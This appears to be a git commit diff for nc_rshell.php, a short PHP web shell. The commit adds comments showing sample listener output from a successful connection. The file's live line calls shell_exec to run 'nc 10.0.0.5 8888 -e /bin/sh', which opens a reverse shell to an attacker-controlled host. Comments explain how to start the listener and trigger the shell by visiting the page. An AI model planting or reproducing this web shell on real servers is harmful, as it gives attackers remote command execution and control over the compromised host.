8e5d6fc28f1ad1dbb4f714268e14deab367c4226
Mike Black <kingmikaelone@gmail.com>
2021-04-06 14:44:23 +0200

    Update nc_rshell.php

--- nc_rshell.php
+++ nc_rshell.php
@@ -3,5 +3,9 @@
 // To start listener on attacker machine
 // nc -lvp 8888
 // on URL type http://exaple.com/nc_rshell.php
+//listening on [any] 4444 ...
+//connect to [10.0.0.5] from [10.0.0.3] 36810
+//ls
+// test.txt
 shell_exec('nc 10.0.0.5 8888 -e /bin/sh');
 ?>
